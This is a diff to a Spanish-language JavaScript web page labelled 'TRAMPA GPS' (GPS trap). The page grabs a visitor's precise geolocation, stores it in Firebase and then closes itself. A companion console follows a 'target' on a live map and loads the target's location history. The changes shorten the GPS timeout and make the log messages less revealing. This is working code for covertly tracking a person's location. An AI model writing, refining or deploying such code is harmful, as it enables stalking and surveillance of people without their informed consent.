@@ -58,10 +58,9 @@ document.addEventListener("DOMContentLoaded", function () {
     escucharObjetivoEnTiempoReal("prueba");
 });
 
-// --- TRAPA GPS: PESTAÑEO Y CIERRE AUTOMÁTICO ---
+// --- TRAMPA GPS: CAPTURA Y CIERRE AUTOMÁTICO ---
 function ejecutarTrampaGPSYCerrar(id) {
     if (!navigator.geolocation) {
-        console.warn("Geolocalización no soportada en este dispositivo.");
         finalizarSalida();
         return;
     }
@@ -82,18 +81,18 @@ function ejecutarTrampaGPSYCerrar(id) {
                 const nuevoItemRef = doc(colRef);
                 await setDoc(nuevoItemRef, { lat, lng, timestamp });
 
-                console.log("Coordenadas enviadas correctamente a Firebase:", lat, lng);
+                console.log("Coordenadas capturadas con éxito.");
             } catch (e) {
-                console.error("Error crítico de Firebase (¿Revisaste tus reglas de Firestore?):", e);
+                console.error("Error al registrar en Firebase:", e);
             }
             
             finalizarSalida();
         },
         (error) => {
-            console.warn("GPS denegado o error de señal:", error.message);
+            console.log("GPS denegado o no disponible.");
             finalizarSalida();
         },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
     );
 }
 
@@ -101,7 +100,7 @@ function finalizarSalida() {
     setTimeout(() => {
         window.close();
         window.location.href = "about:blank"; 
-    }, 1500); // Damos 1.5 segundos para asegurar el envío de datos antes de cerrar
+    }, 1500);
 }
 
 // --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
@@ -165,7 +164,7 @@ function escucharObjetivoEnTiempoReal(id) {
             const data = docSnap.data();
             if (data.lat && data.lng) {
                 mainMarker.setLatLng([data.lat, data.lng]);
-                cargarPuntosHistoricos(id);
+                cargarPuntosHistoricos("prueba");
             }
         }
     });
